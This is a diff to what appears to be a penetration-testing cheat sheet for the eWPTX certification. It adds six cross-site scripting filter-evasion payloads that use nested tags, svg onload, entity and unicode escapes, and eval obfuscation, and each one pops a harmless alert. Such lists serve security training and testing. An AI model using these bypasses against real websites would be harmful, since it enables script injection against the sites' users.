@@ -2,7 +2,31 @@
 List of useful commands for web penetration testing and eWPTX certification
 
 ## XSS
-coming soon
+Possibile evasion methods
+
+```
+<script <script>>alert('l33t')</script>
+```
+
+```
+<svg/onload=alert('l33t')>
+```
+
+```
+<svg><script>alert&lpar;'l33t'&rpar;
+```
+
+```
+<script>\u0061lert('l33t')</script>
+```
+
+```
+<script>eval('\x61lert(\'l33t\')')</script>
+```
+
+```
+<script>eval(8680439..toString(30))(983801..toString(36))</script>
+```
 
 ## SQLi
 
